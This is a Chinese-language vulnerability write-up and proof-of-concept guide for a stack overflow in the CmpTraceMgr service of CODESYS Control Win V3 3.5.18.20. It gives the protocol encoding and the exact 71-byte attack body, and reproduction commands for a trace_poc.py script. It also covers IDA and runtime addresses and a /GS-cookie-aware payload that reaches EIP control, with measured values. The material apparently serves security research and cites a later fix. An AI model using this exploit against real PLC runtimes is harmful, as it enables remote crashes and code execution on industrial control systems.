# CmpTraceMgr 栈溢出 POC 原理说明

对应脚本：`trace_poc.py`（依赖 `codesys_udp_ds.py`）
目标：CODESYS Control Win V3 **3.5.18.20**（`CODESYSControlService.exe`，镜像基址 `0x008A0000`）
分析文件：`CODESYSControlService_dump1.exe.i64`（IDA 基址 `0x00E90000`，即 dump 相对运行时整体偏移 `+0x5F0000`）

> 本文中所有地址都给出两个形式：**IDA 地址** 和 **运行时地址**（= IDA − 0x5F0000）。

---

## 0. 结论速查

| 问题 | 结论 |
|---|---|
| 漏洞在哪 | `TraceMgrServiceHandler`（CmpTraceMgr，组 `0x0F` 服务 `0x0002`） |
| 根因 | 标签内容长度直接进 `memcpy`，与目标栈缓冲区大小之间**没有任何检查** |
| 触发标签 | 顶层 `19/20/21`；容器 `0x86` 内嵌 `48/51` |
| 最短触发 | 内嵌 `tag 48`，**47 字节** body，单包即可 |
| 纯 A 填充的结果 | 打爆 /GS cookie → `int 0x29`，进程死，**拿不到 EIP** |
| 拿到 EIP 的条件 | `[ebp-4]` 必须写成 `___security_cookie XOR ebp`（per-process，需要泄露） |
| 传输上限 | 单个 BLK 帧约 **472 字节** services；分片请求被运行时拒绝 |

---

## 1. 协议分层与数据构造

一个 PoC 报文从外到内共四层，脚本里对应四个构造函数：

```
UDP payload
└─ 数据报头  build_datagram()      12 字节   CmpRouter / CmpBlkDrvUdp
   └─ 通道帧 build_blk()           24 字节   CmpChannelMgr（BLK）
      └─ 服务头 build_services()   20 字节   Services 层
         └─ 标签流 tag()/parent_tag()          业务负载（CmpTraceMgr 解析）
```

### 1.1 数据报头（12 字节）

| 偏移 | 长度 | 值（示例） | 含义 |
|---|---|---|---|
| 0 | 1 | `c5` | 魔数 `DATAGRAM_MAGIC` |
| 1 | 1 | `73` | `hop_info` = (跳数 14 << 3) \| 头长度(双字) |
| 2 | 1 | `40` | `pkt_info` |
| 3 | 1 | `40` | 服务号 `SERVICE_CHANNEL`（通道层） |
| 4 | 1 | `00` | `message_id` |
| 5 | 1 | `11` | 长度域 = (接收方字节数/2 << 4) \| (发送方字节数/2) |
| 6 | 2 | `00 81` | 发送方端点 = (端点索引, IPv4 末字节) |
| 8 | 2 | `01 81` | 接收方端点 = (端点索引, IPv4 末字节) |
| 10 | 2 | `00 00` | 对齐填充 |
| 12 | N | … | 上层数据 |

**端点索引与实际 UDP 端口必须一致**：索引 0 → 1740（运行时），1/2/3 → 1741/1742/1743（客户端）。
运行时会**静默丢弃**索引与源端口不符的包 —— 实测把索引写成 3 而 socket 绑在 1741，握手直接超时。
所以脚本里 `local_idx = local_port - 1740` 是由端口推导的，不能硬编码。

### 1.2 通道帧 BLK（首帧 24 字节头）

| 偏移 | 长度 | 值 | 含义 |
|---|---|---|---|
| 0 | 1 | `01` | `PKT_BLK` |
| 1 | 1 | `81` | 标志位；bit0 = 1 表示这是**首帧** |
| 2 | 2 | `a8 f8` | **token** —— GET_CHANNEL 响应里下发，后续每个帧必须回填 |
| 4 | 4 | … | `channel_id` |
| 8 | 4 | … | `blk_id`（本端自增） |
| 12 | 4 | … | `ack_id`（已收到的对端 blk_id） |
| 16 | 4 | … | `data_size` = 完整 services 块长度 |
| 20 | 4 | … | `crc32(data)`，校验的是**首帧携带的那段数据** |
| 24 | N | … | services 数据 |

续帧（`build_blk(first=False)`）头只有 16 字节，**没有** `data_size` 和 `crc32`，标志位为 `0x80`。

token 是关键坑：GET_CHANNEL 响应第 14..16 字节下发一个 2 字节 token，之后每个 BLK/ACK/KEEPALIVE 都要回填，**填错会被静默丢弃**，大约 30 次 keepalive 后通道被 `0x84` 关闭。

### 1.3 服务头（20 字节）

| 偏移 | 长度 | 值 | 含义 |
|---|---|---|---|
| 0 | 2 | `55 cd` | `PROTO_TAG` = `0xCD55` |
| 2 | 2 | `10 00` | 头长度 = 16 |
| 4 | 2 | `0f 00` | `service_group`（PoC 用 `0x000F` = CmpTraceMgr） |
| 6 | 2 | `02 00` | `service_id`（PoC 用 `0x0002`） |
| 8 | 4 | … | `session_id` |
| 12 | 4 | … | `content_size` = body 长度 |
| 16 | 4 | `00 00 00 00` | additional data |
| 20 | N | … | **body**（标签流） |

`service_id` 位于偏移 **6**，正好是 `sub_1077280` 里 `switch (*(_WORD *)(a2 + 6))` 读的那个字段；`content_size` 位于偏移 **12**，即 `v6 = *(_DWORD *)(a2 + 12)`。

### 1.4 标签层

```
tag_id    (LEB128；最高位 bit7 = 1 表示这是"容器"，id = 值 & 0x7F)
tag_size  (LEB128)
data      (tag_size 字节)
```

**注意：标签里没有"长度前缀"这种说法**，id 和 size 都是 LEB128 变长整数 —— 见第 2 节。

---

## 2. 标签编码详解（问题一：为什么用 LEB128 / leb128_pad3）

### 2.1 先回答结论

> **tag 的 id 和 size 都不是定长字段**，两者都是 **LEB128 变长整数**。
> 真实流量里 size 字段常常是 3 字节（例如 size=4 写成 `84 80 00`），那是**运行时的写方为了 4 字节对齐而做的填充**，不是格式要求；读方对最小 LEB128 编码同样接受。
> 脚本用 `leb128_pad3()` 写 size 字段，是在模仿写方的风格；容器头用 `parent_tag()` 的**最小** `leb128()`，两者都能被正常解析 —— 本次 PoC 就是活证据。

### 2.2 读方证据：`sub_ECB0F0` 就是标准 LEB128 解码

`sub_ECA390(a1, a2)` 只是转调 `sub_ECB1B0`，真正的取值在 `sub_ECB0F0`（IDA `0xECB0F0`）：

```c
v5 = 0;                 // 移位量
*a2 = 0;                // 输出值
v6 = -1;                // 溢出保护
while ( v7 < a3 ) {
    ...读取一个字节 v3...
    v9  = v3 & 0x7F;            // 取低 7 位
    if ( v9 > v6 ) return 14;   // 超过位宽 -> 报错 14
    v6 >>= 7;
    *a2 |= v9 << v5;            // 按 7 位一组累加
    v5  += 7;
    a1[3]++;                    // 前进一个字节
    if ( v3 >= 0 ) return 0;    // bit7 == 0 -> 结束（v3 是 char，>=0 即最高位为 0）
    if ( a1[3] >= a1[1] ) return 1025;
}
```

这就是标准的无符号 LEB128：**7 位一组、小端、最高位为 0 时结束**。读方**不要求**最小编码，也**不检查**对齐 —— 只要合法 LEB128 就能解出来。

### 2.3 写方证据：`sub_EC9750` 的填充算术

`sub_EC9750(writer, tag_id, a3, a4)` 是标签写函数。`LOWORD(a3)==4` 表示写叶子标签，`HIWORD(a3)` 是对齐目标（观察到的调用里为 0 或 2）：

```c
v7 = a2; v8 = 0;
do { v7 >>= 7; ++v8; } while ( v7 );      // v8 = tag_id 的 LEB128 字节数

v9  = a4 ? a4 : 1;                        // 数据长度
v10 = v9 + v8;                            // = 数据长度 + id 字节数
v11 = (v9 + v8) & 3;
v12 = ...;                                // 求出让总长 ≡ HIWORD(a3) (mod 4) 的 size 字段宽度
v10 += v12;                               // v10 = 整个 tag 的总字节数
...
a1[3] += v20;                             // 按总长前进
```

即：**size 字段的字节数是"算"出来的，目标是让 id + size + data 的总长落在 4 字节边界上**。

### 2.4 实测验证

把 IDE 抓包里的 `TRACE_CONFIGURE` 模板（168 字节，`codesys_udp_ds.py:TRACE_CFG_TEMPLATE`）逐 tag 展开：

```
id=0x10  id_bytes=1 size_bytes=3 data= 12 total= 16 total%4=0
id=0x16  id_bytes=1 size_bytes=3 data=  4 total=  8 total%4=0
id=0x12  id_bytes=1 size_bytes=3 data=  8 total= 12 total%4=0
id=0x86  id_bytes=2 size_bytes=2 data= 96 total=100 total%4=0   <- 容器
  id=0x30  id_bytes=1 size_bytes=3 data=  4 total=  8 total%4=0
  id=0x83  id_bytes=2 size_bytes=2 data= 60 total= 64 total%4=0 <- 嵌套容器
    id=0x4d  id_bytes=1 size_bytes=3 data=  8 total= 12 total%4=0
    id=0x20  id_bytes=1 size_bytes=3 data= 12 total= 16 total%4=0
    ...
```

模板里 **20 个 tag 全部 total % 4 == 0**，且容器用 2 字节 size、叶子用 3 字节 —— 和 2.3 的公式完全吻合。

反例（关键）：本次 PoC 的 body 是

```
86 01 | 44 | 30 | c0 80 00 | 41 × 64
 容器头   size=68  叶子标签   size=64    数据
```

外层容器的 `44` 是**最小** LEB128（1 字节），于是外层总长 = 2+1+68 = **71，71 % 4 = 3，并没有对齐** —— 但运行时照样解析成功并进入了漏洞 `memcpy`。

**这就证明了对齐只是写方的风格约定，读方不强制。** 所以脚本里 size 字段用 `leb128_pad3` 只是"长得像 CODESYS 自己发的包"，并非通过校验的必要条件。

### 2.5 脚本里的两个编码函数

| 函数 | 用途 | 说明 |
|---|---|---|
| `leb128(v)` | tag_id（含容器位）、容器 size | 最小变长编码 |
| `leb128_pad3(v)` | **叶子 tag 的 size 字段** | 固定填 3 字节（前两字节带 `0x80` 续位），模仿写方风格 |

顺便说明 `tag()` 的另一个细节：`bytes([tag_id])` 直接把 id 写成单字节，仅当 id < 0x80 成立；容器 id（如 `0x86`）必须走 `parent_tag()` 的 `leb128()`，否则会写成 `0x86` 单字节而丢掉最高位含义。

---

## 3. 为什么溢出数据要包在容器里（问题二：tag 数据结构）

### 3.1 处理器是"两级 switch"

`TraceMgrServiceHandler`（IDA `0x1078580`）先把整个 body 初始化为一个**标签流读取器**，然后循环取 tag id 分派：

```c
sub_ECA2F0(v30, body, len);          // 初始化读取器
sub_ECA390(v30, &v17);               // 取"是否还有下一个"
while ( !v17 ) {
    sub_ECA400(v30, &v15);           // v15 = 当前 tag 的 id
    switch ( v15 ) {
        case 16: ... 标签 0x10  -> 名字
        case 17: ... 标签 0x11
        case 18: ... 标签 0x12
        case 19: sub_ECA510(...); memcpy(v26, src, len);   // 漏洞点
        case 20: sub_ECA510(...); memcpy(v27, src, len);   // 漏洞点
        case 21: sub_ECA510(...); memcpy(v28, src, len);   // 漏洞点
        case 22: ... 标签 0x16
        case 133: /* 0x85 容器 */ ...
        case 134: /* 0x86 容器 */ <-- 内层再开一个 switch
        default: break;              // <-- 顶层出现 48/51 就落这里，被直接跳过
    }
    ...
}
```

**顶层只认 `16,17,18,19,20,21,22,133,134` 这 9 个 id。**

### 3.2 内层 switch 才检查 48/51

`case 134`（即容器 `0x86`）内部会**再走一遍子标签**：

```c
case 134:
    while ( !sub_ECA340(v30) ) {         // 遍历容器内的子标签
        sub_ECA400(v30, &v15);
        switch ( v15 ) {
            case 48: sub_ECA510(...); memcpy(v34, src, len);  // <-- 默认触发点
            case 49: ... v36 = *src;
            case 50: ... v37 = *src;
            case 51: sub_ECA510(...); memcpy(&v35, src, len); // <-- 另一处
            case 52: ... v38 = *(DWORD*)src;
            case 131: /* 0x83 嵌套容器，递归 */
            default: break;
        }
        ...
    }
```

所以 `tag 48 / 51` **只有在 `0x86` 容器内部才会被检查**。把 `30 ...` 放在顶层，`case` 落 `default`，什么都不会发生 —— 容器不是装饰，它是**到达那个分支的唯一寻址路径**。

### 3.3 容器位（bit 7）

tag_id 的最高位是"容器"标志：

- **读**：`sub_ECB1B0` 用 `(entry[7] & 0x80) == 0` 判断是叶子还是容器；叶子读完即前进，容器则要继续递归。
- **取内容**：`sub_ECA510` 里有一句 `if ( (v5[4] & 0x80) != 0 ) return 1028;` —— 对容器调用"取内容"会返回错误码 1028。
- **写**：`parent_tag(0x86, children)` → `leb128(0x86 | 0x80)` = `86 01`，再跟上 children 的长度。

这也解释了 `0x86` 为什么编码成两字节 `86 01`：`0x86` 已经 ≥ 0x80，LEB128 需要续位字节。

### 3.4 为什么选 48 而不是 19/20/21

两者的可达性对比如下（详见第 4 节偏移表）：

| | 顶层 `19/20/21` | 容器内 `48/51` |
|---|---|---|
| 到返回地址的距离 | 3004 ~ 3012 字节 | **24 / 32 字节** |
| body 大小 | > 3 KB，**超过单帧传输上限** | 47 字节，单包可发 |
| 报文形态 | 需要构造完整 trace 配置 | **与合法 `TRACE_CONFIGURE` 完全同形** |

合法的 `TRACE_CONFIGURE` body 本来就把变量描述放在 `0x86` 容器里（`86 01 e0 00 30 84 80 00 0a 00 00 00`），所以走 `tag 48` 的报文"长得完全正常"，只是把那个 4 字节整数换成了长数据。

---

## 4. 漏洞功能点

### 4.1 分发路径

```
Services 层  group=0x000F  service=0x0002
   └─ sub_1077280(...)                      switch (*(WORD*)(req+6))   // 服务号
        case 2:  TraceMgrServiceHandler(req, body, len, &writer)
                    └─ switch (tag_id)  // 见第 3 节
```

* CmpTraceMgr 用 `sub_106BFA0(0x0F, sub_1077280)` 注册组处理器（包装函数 `sub_1077270`）。
* `sub_1077280` 实现 `case 1 .. 0x13` 共 **19** 个服务。
* `xrefs_to(TraceMgrServiceHandler)` **只有 1 个**，就在 `case 2`；对 19 个 case 的处理函数逐一扫描 `memcpy` 调用，**只有它含有 memcpy**（5 处）。
  即：服务 `0x0002` 是唯一能到达该漏洞的入口，与它叫什么名字无关。

> 名字说明：脚本里的常量 `TRACE_CONFIGURE` 是**按行为起的别名**（IDE 用它对 0x0002 下发完整 trace 配置、拿回 tag `0x40` 句柄），不是符号。文章里的 `TraceMgrSrvPacketCreate` 指的应当就是这个处理器（它描述的 `19/20/21 进 memcpy 分支` 与之逐条吻合），但本版本二进制里没有这个字符串；最接近的是 `tracemgrpacketcreate` / `TraceMgrPacketCreate`。

### 4.2 五个 memcpy 点

| 触发 tag | 位置 | 目标缓冲区 | 帧内偏移 | 到返回地址 | IDA 地址 | 运行时地址 |
|---|---|---|---|---|---|---|
| **48** (`0x30`) | 容器 `0x86` 内层 | `v34[8]` | `ebp-0x1C` | **32** | `0x1078833` | `0x00A88833` |
| **51** (`0x33`) | 容器 `0x86` 内层 | `v35` (u32) | `ebp-0x14` | **24** | `0x107890D` | `0x00A8890D` |
| 19 (`0x13`) | 顶层 | `v26[4]` | `ebp-0xBC0` | 3012 | `0x107871B` | `0x00A8871B` |
| 20 (`0x14`) | 顶层 | `v27[4]` | `ebp-0xBBC` | 3008 | `0x1078755` | `0x00A88755` |
| 21 (`0x15`) | 顶层 | `v28[20]` | `ebp-0xBB8` | 3004 | `0x107878F` | `0x00A8878F` |

函数栈帧关键偏移：cookie `0xBFC`（= `ebp-4`）、保存的 EBP `0xC00`、返回地址 `0xC04`。

### 4.3 根因

五个点都是同一个模式：

```c
sub_ECA510(reader, &src, &len);     // 只做一件事：取出内容指针和长度
memcpy(dst, src, len);              // len 完全来自报文，没有和 sizeof(dst) 比较
```

`sub_ECA510` 返回的是标签里写的长度，标签解析阶段只验证"这些字节确实在 body 里"，从不验证"能否装进目标缓冲区"。3.5.19.0 的修复正是加了长度校验并改用封装过的取值函数。

---

## 5. POC 数据构造

### 5.1 握手（发送攻击报文之前必须完成）

```
1. GET_CHANNEL  (CmpChannelMgr 0xC3)        -> channel_id + token
2. CmpDevice 0x000A (会话)   session=0x11   -> session_id (tag 0x21)
3. CmpDevice 0x0002 step1                   -> RSA 公钥 (tag 0x27) + challenge (tag 0x26)
4. CmpDevice 0x0002 step2 (登录)            -> tag 0x21 = "app key"，之后作为 session_id
5. CmpApp 0x0001 (应用登录) tag 0x01="App\0" -> 绑定到应用
6. 发送 TraceMgr 攻击报文
```

登录口令块：`password.ljust(64, 0) XOR (challenge * 2)`，64 字节明文，RSA-OAEP-SHA256。
（细节见 `codesys_udp_ds.py` 与 `codesys-v3-udp-client` 记忆条目。）

发送前脚本会调 `quiesce()`：**ACK 掉 `app_login` 的响应并清空残余数据报**。因为 `recv_services()` 只对多帧响应发 ACK，单帧的 app_login 响应不会被 ACK，运行时会不断重传它 —— 不清掉的话，PoC 的 `call()` 会读到那个陈旧响应，误报"运行时回复了"。

### 5.2 攻击报文逐字节

默认形态（`tag 48`，64 个 `A`）：

**body（71 字节）**

```
86 01             容器 id = 0x86（LEB128，两字节）
44                容器长度 = 68（最小 LEB128）
30                子标签 id = 48
c0 80 00          子标签长度 = 64（LEB128，写方风格的 3 字节填充）
41 × 64           数据：64 个 'A'
```

**services（91 字节）** = 20 字节服务头 + 71 字节 body

```
55 cd | 10 00 | 0f 00 | 02 00 | <session_id> | 47 00 00 00 | 00 00 00 00
PROTO   头长    组 0x0F  服务 0x02               content_size=71
```

**BLK（首帧，24 字节头 + 91）**：`01 81 | <token> | <channel_id> | blk_id | ack_id | 5b 00 00 00 | <crc32> | <services>`

**数据报** = 12 + 115 = **127 字节**，远低于 472 字节单帧上限。

### 5.3 纯 A 填充 → 走到 /GS 检查失败

`memcpy` 把 64 字节写进 `ebp-0x1C`，覆盖 `ebp-0x1C .. ebp+0x23`：

```
ebp-0x1C + 0   ~ +23   ->  24 字节 filler
ebp-4  (cookie 槽)     ->  被 'A' 覆盖   ★
ebp+0        (保存EBP) ->  0x41414141
ebp+4        (返回地址) ->  0x41414141
```

函数带 **/GS 栈保护**（`var_4`，帧偏移 `0xBFC`），尾声是：

```asm
mov ecx, [ebp-4]                ; 槽值
xor ecx, ebp                    ; 还原出 ___security_cookie
pop edi / pop esi / pop ebx
call __security_check_cookie    ; cmp ecx, ___security_cookie
mov esp, ebp / pop ebp / ret
```

而 **5 个目标缓冲区全部位于 cookie 下方**，任何能够到返回地址的填充都必然先碾过 cookie。于是：

* 检查失败 → `__report_gsfailure` → `int 0x29`（`__fastfail`，ECX = 2 = `FAST_FAIL_STACK_COOKIE_CHECK_FAILURE`）→ 进程立即终止。
* 效果：**溢出确实发生了，但拿不到 EIP**，是一次稳定的远程 DoS。

### 5.4 GS 感知 payload（能拿到 EIP）

槽里要写的不是 cookie 本身，而是 `___security_cookie XOR ebp`。脚本用 `--security-cookie` / `--frame-ebp` 拼出：

```
偏移 0   ~ 23   填充
偏移 24  ~ 27   slot = cookie XOR ebp
偏移 28  ~ 31   保存的 EBP（会被 pop 掉，值无所谓）
偏移 32  ~ 35   返回地址
```

实测（2026-09-23）：

| 项 | 值 |
|---|---|
| `___security_cookie`（运行时 `0x00F9B264`） | `0x4356070A` |
| `ebp` @ memcpy | `0x027DEDD0` |
| 计算出的 slot | `0xDAEA2B41` |
| 现场 `[ebp-4]` 实际值 | `0xDAEA2B41` ✓ |
| 结果 | **EIP = 0x41414141，ECX = 0x4356070A**（检查通过） |

两个前提值得写清楚：

1. **`ebp` 对这条调用路径在同一进程内是稳定的** —— 实测两次不同请求命中同一个 memcpy，`ebp` 完全相同。所以"先发一次探测请求拿 ebp、再发攻击请求"是可行的。
2. **这是"知道 cookie 的利用"，不是"盲绕过"**。cookie 和 ebp 都是 per-process 的：对同一进程可重复使用，进程重启后失效。爆破不可行（每次猜错 = 不可拦截的 `int 0x29` + 进程重启，共 2³² 次）。要做远程利用链，仍然需要一个信息泄露原语。

> 注：本 payload 把返回地址写成 `0x41414141`，进程必然崩，所以实际是"一个进程一条命"。如果返回地址指向一条能正常返回的 ROP 链，同一个 cookie 在同一进程内可以反复使用。

---

## 6. 传输限制（为什么文章里的 0x18AC 打不出来）

对 `tag 19` 做溢出需要 > 3012 字节，文章用 0x18AC（6316）字节，但本环境下发不出去：

| 现象 | 实测 |
|---|---|
| 单帧 services 上限 | body 452 有应答，body 484 被**静默丢弃**（≈512 字节数据报） |
| 分片请求（`blk_first` + `blk_cont`） | **被拒绝**，运行时回 `0x84` 关闭通道 |
| 分片格式本身 | 与运行时自己发的完全一致（首帧 472B、续帧 480B、`blk_id` 递增、`ack_id` 不变），逐字节比对过 `1.pcapng` |
| IDE 的 93KB 应用下载 | 源端口是 UDP **1743**（`GatewayService`），说明重组策略**与端口相关** |
| 借用 1743 | 该端口被 GatewayService 占用；且把数据报端点索引改成 3 而 socket 绑在 1741 会被直接拒绝 |

因此默认改用 `tag 48`：只需 47 字节，单包可发。

---

## 7. 复现步骤

```bash
# 0. 环境：CODESYS Control Win V3 3.5.18.20 运行中，目标 IP 192.168.125.129
#    x64dbg 附加 CODESYSControlService.exe，断点打在 0x00A88833

# 1. 纯 A 填充：验证溢出 + 观察 /GS 拦截
python trace_poc.py 192.168.125.129
#    -> 断点命中，dest = [ebp-0x1C]，size = 0x40
#    -> 单步过后 [ebp+4] = 0x41414141
#    -> 进程停在 int 0x29，ECX = 2

# 2. 只看报文（不发包）
python trace_poc.py 192.168.125.129 --dry-run
python trace_poc.py 192.168.125.129 --tag 51 --dry-run

# 3. GS 感知：先探测拿 ebp，再拼 payload
python trace_poc.py 192.168.125.129 --tag 48 --length 4      # 触发断点，读 ebp
#    在 x64dbg 读 0x00F9B264 得 ___security_cookie
python trace_poc.py 192.168.125.129 \
       --security-cookie 0x4356070A --frame-ebp 0x027DEDD0
#    -> 返回地址生效：EIP = 0x41414141
```

常用参数：`--tag {19,20,21,48,51}`、`--length`、`--ret`、`--local-port`、`--security-cookie`/`--frame-ebp`。

---

## 8. 附：地址速查

| 名称 | IDA | 运行时 |
|---|---|---|
| `TraceMgrServiceHandler` | `0x1078580` | `0x00A88580` |
| 组分发 `sub_1077280` | `0x1077280` | `0x00A87280` |
| 组注册 `sub_106BFA0(0x0F, …)` | `0x106BFA0` | `0x00A7BFA0` |
| memcpy tag48 / tag19 | `0x1078833` / `0x107871B` | `0x00A88833` / `0x00A8871B` |
| 标签读 `sub_ECB0F0`（LEB128） | `0xECB0F0` | `0x008DB0F0` |
| 标签写 `sub_EC9750` | `0xEC9750` | `0x008D9750` |
| 取内容 `sub_ECA510` | `0xECA510` | `0x008DA510` |
| `___security_cookie` | `0x158B264` | `0x00F9B264` |
| `__security_check_cookie` | `0x12CE9A5` | `0x00CDE9A5` |

换算：**运行时地址 = IDA 地址 − 0x5F0000**（dump 相对运行时整体偏移）。
